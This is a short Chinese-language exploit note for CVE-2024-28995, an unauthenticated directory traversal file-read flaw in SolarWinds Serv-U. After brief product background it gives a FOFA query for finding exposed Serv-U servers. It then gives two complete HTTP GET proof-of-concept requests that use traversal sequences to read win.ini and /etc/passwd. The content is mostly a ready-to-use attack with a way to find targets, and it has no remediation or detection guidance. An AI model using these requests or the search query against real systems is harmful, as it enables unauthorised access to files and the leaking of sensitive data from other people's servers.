## SolarWinds-Serv-U目录遍历漏洞(CVE-2024-28995)

SolarWinds 是一家提供广泛的 IT 管理和网络管理软件解决方案的公司,SolarWinds 的产品被设计用于监控和管理网络设备、服务器、应用程序和网络流量等,Serv-U 是 SolarWinds 提供的一款 FTP（文件传输协议）服务器软件，它允许用户在 Windows 、Linux 系统上设置和管理 FTP 服务,Serv-U 提供了多种功能，以确保文件传输的安全性、效率和灵活性。

CVE-2024-28995 SolarWinds Serv-U FTP目录遍历文件读取漏洞，攻击者无需登陆即可构造恶意请求读取系统上文件，造成敏感信息泄漏。

## fofa

```
server="Serv-U"
```

## poc

```
GET /?InternalDir=/../../../../windows&InternalFile=win.ini HTTP/1.1
Host: xx.xxx.xxx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

```
GET /?InternalDir=\..\..\..\..\etc&InternalFile=passwd HTTP/1.1
Host: xxx.xxx.xxx.xxx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept-Encoding: gzip, deflate
Accept: */*
Connection: keep-alive
```

![image-20240614211748043](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202406142117114.png)